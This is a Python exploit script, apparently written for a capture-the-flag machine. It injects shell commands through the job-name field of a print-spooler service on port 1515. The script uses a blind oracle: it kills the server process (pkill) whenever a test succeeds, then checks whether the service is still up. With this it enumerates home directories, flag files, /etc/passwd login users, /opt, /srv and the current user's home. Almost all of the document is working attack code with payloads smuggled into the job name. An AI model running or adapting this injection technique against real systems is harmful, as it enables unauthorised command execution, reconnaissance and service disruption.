#!/usr/bin/env python3
import socket, time, sys

T = '10.129.38.158'

def lpd(jn, t=8):
    s=socket.socket();s.settimeout(t)
    try:
        s.connect((T,1515));s.send(b'\x02archive_intake')
        time.sleep(0.15);s.recv(1024)
        ct=(f'J{jn}\n').encode()
        s.send(b'\x01\x00\x00\x00\n'+str(len(ct)).encode()+b'\n'+ct)
        time.sleep(0.3);s.recv(4096)
    except: pass
    finally: s.close()

def alive():
    s=socket.socket();s.settimeout(2)
    try:
        s.connect((T,1515));s.send(b'\x03');d=s.recv(4096);s.close();return True
    except: return False

def check(path):
    lpd(f"';test -f {path} && pkill -f server.py;echo '")
    time.sleep(0.2)
    a = alive()
    if not a:
        for _ in range(20):
            time.sleep(0.5)
            if alive(): break
        return True
    return False

def check_dir(path):
    lpd(f"';test -d {path} && pkill -f server.py;echo '")
    time.sleep(0.2)
    a = alive()
    if not a:
        for _ in range(20):
            time.sleep(0.5)
            if alive(): break
        return True
    return False

# Step 1: List /home/ directories
print("=== Enumerating /home/ ===", flush=True)
users_to_check = ['dave', 'paper', 'paperwork', 'lp', 'lpd', 'nobody', 'archivist', 'admin', 'printer', 'archive', 'spool', 'daemon', 'sys', 'www', 'www-data', 'user', 'support']
for u in users_to_check:
    if check_dir(f'/home/{u}'):
        print(f'  /home/{u}: EXISTS', flush=True)
        # Check for user.txt inside
        if check(f'/home/{u}/user.txt'):
            print(f'  *** /home/{u}/user.txt: FOUND! ***', flush=True)
        if check(f'/home/{u}/flag.txt'):
            print(f'  *** /home/{u}/flag.txt: FOUND! ***', flush=True)
        if check(f'/home/{u}/flag'):
            print(f'  *** /home/{u}/flag: FOUND! ***', flush=True)
    time.sleep(0.2)

# Step 2: Check common root-level flag locations
print("\n=== Checking root-level flag locations ===", flush=True)
for f in ['/user.txt', '/flag.txt', '/flag', '/root/root.txt', '/root/flag.txt']:
    if check(f):
        print(f'  *** {f}: FOUND! ***', flush=True)

# Step 3: Check /etc/passwd for non-system users
print("\n=== Checking /etc/passwd accessible users ===", flush=True)
lpd("';grep -E '/bin/(bash|sh|zsh)' /etc/passwd 2>/dev/null | cut -d: -f1 > /tmp/shell_users;test -s /tmp/shell_users && pkill -f server.py;echo '")
time.sleep(0.3)
a = alive()
if not a:
    print('  Users with login shells DO exist', flush=True)
    for _ in range(20):
        time.sleep(0.5)
        if alive(): break

# Step 4: Check /home directories via ls
print("\n=== Testing /home/ accessibility ===", flush=True)
if check_dir('/home'):
    print('  /home/ directory is accessible', flush=True)
else:
    print('  /home/ directory NOT accessible', flush=True)

# Step 5: Check /tmp for any flag files
print("\n=== Checking /tmp/ for flags ===", flush=True)
for f in ['/tmp/user.txt', '/tmp/flag.txt', '/tmp/flag']:
    if check(f):
        print(f'  *** {f}: FOUND! ***', flush=True)

# Step 6: Check /opt and /var
print("\n=== Checking /opt/ and /var/ ===", flush=True)
for d in ['/opt', '/srv']:
    if check_dir(d):
        print(f'  {d}: EXISTS', flush=True)
        # List contents using echo
        lpd(f"';ls {d}/ > /tmp/ls_out 2>/dev/null;test -s /tmp/ls_out && pkill -f server.py;echo '")
        time.sleep(0.3)
        if not alive():
            print(f'  {d}/ has contents', flush=True)
            for _ in range(20):
                time.sleep(0.5)
                if alive(): break

# Step 7: Check current user's home
print("\n=== Checking current user ===", flush=True)
lpd("';echo $HOME > /tmp/home_dir;test -s /tmp/home_dir && pkill -f server.py;echo '")
time.sleep(0.3)
a = alive()
if not a:
    print('  $HOME is accessible', flush=True)
    for _ in range(20):
        time.sleep(0.5)
        if alive(): break

# Check if /home/lp exists (lp user home)
if check_dir('/var/spool/lpd'):
    print('  /var/spool/lpd: EXISTS', flush=True)

print("\n=== Enumeration complete ===", flush=True)
